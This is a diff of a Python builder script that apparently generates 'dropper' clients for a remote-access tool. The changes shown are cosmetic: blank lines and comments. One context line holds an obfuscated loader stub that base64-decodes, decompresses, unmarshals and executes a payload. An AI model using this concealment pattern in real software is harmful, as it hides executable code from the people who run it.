@@ -213,18 +213,13 @@ def main():
 
     return dropper
 
+
+
+
+
 def _update(input, output, task=None):
     diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
     util.display("({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80), style='dim', color='reset')
-
-
-
-
-
-
-
-
-
 
 
 def _modules_(options, **kwargs):
@@ -253,18 +248,6 @@ def _modules_(options, **kwargs):
     __load__.set()
     util.display("({} modules added to client)".format(len(modules)), color='reset', style='dim')
     return modules
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -312,6 +295,7 @@ def _modules(options, **kwargs):
     return exit()
 
 
+
 def _imports(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Imports", color='reset', style='bright')
@@ -334,6 +318,7 @@ def _imports(options, **kwargs):
             if not line.split()[0] == 'import':
                 continue
 
+            # Ignore all the imports from core?
             for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
                 if x in line: break
             else:
@@ -348,6 +333,7 @@ def _imports(options, **kwargs):
             imports.remove(item)
 
     return imports
+
 
 
 def _imports_(options, **kwargs):
@@ -381,6 +367,8 @@ def _imports_(options, **kwargs):
                 imports.remove(item)
     return imports
 
+
+
 def _hidden(options, **kwargs):
 
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
@@ -393,7 +381,7 @@ def _hidden(options, **kwargs):
             for i in str().join(line.split()[1:]).split(';')[0].split(','):
                 i = line.split()[1] if i == '*' else i
                 hidden.add(i)
-        elif len(line.split()) > 3:
+        elif len(line.split()) > 3: # bug. this line never gets hit. Doesn't break so leaving in
             for i in str().join(line.split()[3:]).split(';')[0].split(','):
                 i = line.split()[1] if i == '*' else i
                 hidden.add(i)
@@ -401,6 +389,7 @@ def _hidden(options, **kwargs):
     globals()['__load__'].set()
     util.display("({} imports from {} modules)".format(len(list(hidden)), len(kwargs['modules'])), color='reset', style='dim')
     return list(hidden)
+
 
 
 def _payload(options, **kwargs):
@@ -633,6 +622,8 @@ exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(
         util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
     return name
 
+
+
 @util.threaded
 def _spinner(flag):
     spinner = itertools.cycle(['-', '/', '|', '\\'])
@@ -645,6 +636,8 @@ def _spinner(flag):
             sys.stdout.flush()
         except:
             break
+
+
 
 if __name__ == '__main__':
     main()
